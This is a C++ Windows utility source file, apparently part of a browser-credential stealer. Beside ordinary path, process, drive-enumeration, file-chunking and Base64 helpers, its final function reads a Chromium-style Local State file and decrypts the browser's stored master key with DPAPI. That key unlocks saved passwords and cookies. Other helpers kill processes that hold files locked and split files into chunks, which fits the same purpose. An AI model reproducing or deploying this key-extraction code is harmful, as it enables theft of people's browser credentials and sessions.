#include "utils.h"

std::string HPathGetParent(std::string path) {
  if (path.back() == '\\') path.pop_back();

  size_t lastSeparatorPos = path.find_last_of("/\\");
  if (lastSeparatorPos != std::string::npos) {
    path = path.substr(0, lastSeparatorPos);
    if (path.back() != '\\') path.push_back('\\');
    return path;
  }

  return std::string();
}

std::string HPathGetName(std::string path) {
  if (path.back() == '\\') path.pop_back();

  size_t lastSeparatorPos = path.find_last_of("/\\");
  if (lastSeparatorPos != std::string::npos) {
    return path.substr(lastSeparatorPos + 1, path.length());
  }

  return std::string();
}

std::string HPathGetWinTmp(const std::string& filename) {
  std::string tmp;

  CHAR tempPath[MAX_PATH];
  DWORD pathLength = GetTempPathA(MAX_PATH, tempPath);

  if (pathLength == 0) {
    return tmp;
  }

  tmp = std::string(tempPath, pathLength);
  if (filename.length() != 0) {
    if (tmp.back() != '\\') tmp.push_back('\\');
    tmp += filename;
  }

  return tmp;
}

std::string HPathGetWinFld(REFKNOWNFOLDERID id) {
  PWSTR pwPath;
  std::string path;

  HRESULT result = SHGetKnownFolderPath(id, 0, NULL, &pwPath);
  if (SUCCEEDED(result)) {
    int size_needed =
        WideCharToMultiByte(CP_UTF8, 0, pwPath, -1, NULL, 0, NULL, NULL);
    path.resize(size_needed - 1);
    WideCharToMultiByte(CP_UTF8, 0, pwPath, -1, &path[0], size_needed, NULL,
                        NULL);
  }
  CoTaskMemFree(pwPath);

  return path;
}

void HPathReadDirectory(
    const std::string& path,
    std::function<bool(const WIN32_FIND_DATAA&)> handleFunc) {
  WIN32_FIND_DATAA findData;
  HANDLE findHandle = FindFirstFileA((path + "\\*").c_str(), &findData);

  if (findHandle == INVALID_HANDLE_VALUE) {
    FindClose(findHandle);
    return;
  }

  do {
    if (!handleFunc(findData)) {
      break;
    }
  } while (FindNextFileA(findHandle, &findData));

  FindClose(findHandle);
}

bool HProcTerminateTree(DWORD id) {
  HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (hProcessSnap == INVALID_HANDLE_VALUE) {
    return false;
  }

  PROCESSENTRY32 pe32;
  pe32.dwSize = sizeof(PROCESSENTRY32);

  if (Process32First(hProcessSnap, &pe32)) {
    do {
      if (pe32.th32ParentProcessID == id) {
        HANDLE hProcess =
            OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
        if (hProcess != NULL) {
          TerminateProcess(hProcess, 0);
          CloseHandle(hProcess);
        }
      }
    } while (Process32Next(hProcessSnap, &pe32));
  }

  CloseHandle(hProcessSnap);
  return true;
}

bool HPathCanRead(const std::string& path) {
  if (HPathIsFld(path)) return true;
  if (!HPathIsFile(path)) return false;

  HANDLE fileHandle =
      CreateFileA(path.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL,
                  OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

  if (fileHandle == INVALID_HANDLE_VALUE) {
    return false;
  }

  CloseHandle(fileHandle);
  return true;
}

size_t HPathFileSize(const std::string& path) {
  std::ifstream in(path, std::ifstream::ate | std::ifstream::binary);
  size_t size = in.tellg();
  in.close();
  return size;
}

bool HProcTerminate(DWORD id) {
  HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, id);
  if (hProcess == NULL) {
    return false;
  }

  if (!TerminateProcess(hProcess, 0)) {
    CloseHandle(hProcess);
    return false;
  }

  CloseHandle(hProcess);
  return true;
}

bool HProcGetIdLockingFile(const std::string& path, std::vector<DWORD>& ids) {
  DWORD dwSession;
  WCHAR szSessionKey[CCH_RM_SESSION_KEY + 1] = {0};
  DWORD dwError = RmStartSession(&dwSession, 0, szSessionKey);
  const wchar_t* filepath = HStringToANSI(path);

  if (dwError != ERROR_SUCCESS) {
    return false;
  }

  dwError = RmRegisterResources(dwSession, 1, &filepath, 0, NULL, 0, NULL);
  if (dwError != ERROR_SUCCESS) {
    RmEndSession(dwSession);
    return false;
  }

  DWORD dwReason;
  UINT nProcInfoNeeded;
  UINT nProcInfo = 10;
  RM_PROCESS_INFO rgpi[10];

  dwError = RmGetList(dwSession, &nProcInfoNeeded, &nProcInfo, rgpi, &dwReason);
  if (dwError != ERROR_SUCCESS) {
    RmEndSession(dwSession);
    return false;
  }

  for (UINT i = 0; i < nProcInfo; i++) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE,
                                  rgpi[i].Process.dwProcessId);
    if (hProcess) {
      FILETIME ftCreate, ftExit, ftKernel, ftUser;
      if (GetProcessTimes(hProcess, &ftCreate, &ftExit, &ftKernel, &ftUser) &&
          CompareFileTime(&rgpi[i].Process.ProcessStartTime, &ftCreate) == 0) {
        ids.emplace_back(rgpi[i].Process.dwProcessId);
      }
      CloseHandle(hProcess);
    }
  }

  RmEndSession(dwSession);
  return true;
}

std::vector<std::string> HPathGetFiles(const std::string& path) {
  std::vector<std::string> files;

  HPathReadDirectory(path, [&](const WIN32_FIND_DATAA& findData) {
    if (findData.dwFileAttributes != INVALID_FILE_ATTRIBUTES &&
        !(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
      files.emplace_back(HPathAdd(path, findData.cFileName));
    }

    return true;
  });

  return files;
}

std::vector<std::string> HPathGetDrives() {
  std::vector<std::string> drives = {};
  DWORD lgDrives = GetLogicalDrives();

  if (lgDrives == 0) {
    return drives;
  }

  for (char letter = 'A'; letter <= 'Z'; ++letter) {
    if (lgDrives & 1) {
      std::string path = std::string(1, letter) + ":\\";
      UINT type = GetDriveTypeA(path.c_str());

      switch (type) {
        case DRIVE_REMOVABLE:
        case DRIVE_FIXED:
        case DRIVE_REMOTE:
        case DRIVE_CDROM:
          drives.push_back(path);
          break;
        case DRIVE_NO_ROOT_DIR:
        case DRIVE_UNKNOWN:
        case DRIVE_RAMDISK:
        default:
          break;
      }
    }
    lgDrives >>= 1;
  }

  return drives;
}

std::string HPathAdd(const std::string& base, const std::string& path,
                     bool isdir) {
  std::string result = base + (base.back() == '\\' ? path : '\\' + path);
  if (isdir) result.push_back('\\');
  return result;
}

bool HPathIsFld(const std::string& path) {
  return GetFileAttributesA(path.c_str()) != INVALID_FILE_ATTRIBUTES &&
         GetFileAttributesA(path.c_str()) & FILE_ATTRIBUTE_DIRECTORY;
}

bool HPathIsFile(const std::string& path) {
  return GetFileAttributesA(path.c_str()) != INVALID_FILE_ATTRIBUTES &&
         !(GetFileAttributesA(path.c_str()) & FILE_ATTRIBUTE_DIRECTORY);
}

bool HPathExists(const std::string& path) {
  return GetFileAttributesA(path.c_str()) != INVALID_FILE_ATTRIBUTES;
}

wchar_t* HStringToANSI(const std::string& str) {
  int bufferSize = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, nullptr, 0);
  if (bufferSize == 0) return nullptr;

  WCHAR* results = new WCHAR[bufferSize];
  MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, results, bufferSize);
  return results;
}

std::string HStringToUTF8(const std::wstring& wstr) {
  int bufferSize = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, nullptr, 0,
                                       nullptr, nullptr);
  if (bufferSize == 0) return std::string();

  std::string result(bufferSize, 0);
  WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &result[0], bufferSize,
                      nullptr, nullptr);
  return result;
}

std::string HStringGetUUID(char sep) {
  std::string outid;
  char* str;
  UUID uuid;

  UuidCreate(&uuid);
  UuidToStringA(&uuid, (RPC_CSTR*)&str);
  if (str) {
    outid = std::string(str);
  }
  RpcStringFreeA((RPC_CSTR*)&str);

  std::replace(outid.begin(), outid.end(), '-', sep);
  return outid;
}

std::string HStringGetRandom(size_t len) {
  const std::string characters =
      "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
  std::random_device rd;
  std::mt19937 rng(rd());
  std::uniform_int_distribution<int> distribution(0, characters.size() - 1);

  std::string randomString(len, ' ');
  for (char& c : randomString) {
    c = characters[distribution(rng)];
  }
  return randomString;
}

std::vector<std::string> HChunkFile(const std::string& path, size_t chunkSize) {
  std::vector<std::string> files;
  std::ifstream ifs(path, std::ios::binary);
  if (!ifs) {
    return files;
  }

  ifs.seekg(0, std::ios::end);
  std::size_t fileSize = ifs.tellg();
  ifs.seekg(0, std::ios::beg);

  std::size_t numChunks = (fileSize + chunkSize - 1) / chunkSize;
  std::string base = HPathGetParent(path);

  for (std::size_t i = 0; i < numChunks; ++i) {
    std::string chunkpath =
        base + HPathGetName(path) + "_" + std::to_string(i + 1) + ".bin";
    std::ofstream out(chunkpath, std::ios::binary);

    if (!out) {
      continue;
    }

    std::size_t remainingBytes = chunkSize;
    while (remainingBytes > 0) {
      char buffer[4096];

      std::size_t bytesRead = std::min(remainingBytes, sizeof(buffer));
      ifs.read(buffer, bytesRead);
      out.write(buffer, bytesRead);
      remainingBytes -= bytesRead;

      if (ifs.eof()) {
        break;
      }
    }

    out.close();
    files.emplace_back(chunkpath);
  }

  ifs.close();
  return files;
}

std::string HBase64Encode(const std::vector<char>& in) {
  std::vector<unsigned char> out;
  out.reserve(((in.size() + 2) / 3) * 4);
  int val = 0, valb = -6;
  for (unsigned char c : in) {
    if (c == '\n') continue;
    val = (val << 8) + c;
    valb += 8;
    while (valb >= 0) {
      out.push_back(BASE64_CHARS[(val >> valb) & 0x3F]);
      valb -= 6;
    }
  }
  if (valb > -6) {
    out.push_back(BASE64_CHARS[((val << 8) >> (valb + 8)) & 0x3F]);
  }
  out.resize((out.size() + 3) / 4 * 4, '=');
  return std::string(out.begin(), out.end());
}

std::vector<char> HBase64Decode(const std::string& in) {
  std::vector<int> T(256, -1);
  for (int i = 0; i < 64; i++) {
    T[BASE64_CHARS[i]] = i;
  }

  std::vector<char> out;
  out.reserve((in.size() * 3) / 4);
  int val = 0, valb = -8;
  for (unsigned char c : in) {
    if (c == '\n') continue;
    if (T[c] == -1) break;
    val = (val << 6) + T[c];
    valb += 6;
    if (valb >= 0) {
      out.push_back(static_cast<char>((val >> valb) & 0xFF));
      valb -= 8;
    }
  }
  return out;
}

std::string HGetDecryptKey(const std::string& filePath) {
  try {
    std::ifstream ifs(filePath);
    std::string localStateRaw((std::istreambuf_iterator<char>(ifs)),
                              (std::istreambuf_iterator<char>()));
    json localStateJson = json::parse(localStateRaw);

    std::vector<char> bytes = HBase64Decode(
        localStateJson["os_crypt"]["encrypted_key"].get<std::string>());
    bytes.erase(bytes.begin(), bytes.begin() + 5);

    DATA_BLOB inData = {static_cast<DWORD>(bytes.size()),
                        reinterpret_cast<BYTE*>(bytes.data())};
    DATA_BLOB outData = {0};

    if (CryptUnprotectData(&inData, nullptr, nullptr, nullptr, nullptr,
                           CRYPTPROTECT_LOCAL_MACHINE, &outData)) {
      std::vector<char> result(outData.cbData);
      memcpy(result.data(), outData.pbData, outData.cbData);
      LocalFree(outData.pbData);
      return HBase64Encode(result);
    } else {
      return std::to_string(GetLastError());
    }

    ifs.close();
  } catch (std::exception& e) {
    return std::string();
  }
}
